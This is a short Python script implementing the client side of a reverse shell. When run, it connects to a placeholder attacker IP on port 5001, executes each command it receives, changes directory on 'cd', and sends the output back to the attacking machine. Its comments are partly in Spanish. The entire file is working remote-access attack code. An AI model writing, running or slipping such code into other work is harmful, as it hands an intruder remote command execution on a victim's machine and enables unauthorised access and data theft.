import os
from socket import socket
from subprocess import getoutput
from os import chdir, getcwd

# Define the ip address and port of the server (attacking machine)
attacker_ip = "XXX.XXX.XXX.XXX"
attacker_port = 5001


def clear_terminal():

    if os.name == 'posix':  # Linux
        os.system('clear')

    elif os.name == 'nt':  # Windows
        os.system('cls')

    else:
        print("The operating system could not be determined")


def reverse_shell():

    # Create the client socket and establish a connection
    client_socket = socket()
    client_socket.connect((attacker_ip, attacker_port))

    while True:

        # Receive the command from the attacking machine
        command = client_socket.recv(4096).decode()

        if command == 'exit':

            # Close the client socket
            client_socket.close()

            break

        elif command.split(" ")[0] == 'cd':

            # Change working directory
            chdir(" ".join(command.split(" ")[1:]))

            client_socket.send("\nCurrent route: {}".format(getcwd()).encode())

        else:

            # Ejecutamos el comando y obtenemos su salida:
            salida = getoutput(command)

            # Enviamos la salida a la máquina atacante
            client_socket.send(salida.encode())


def main():

    clear_terminal()

    reverse_shell()


main()
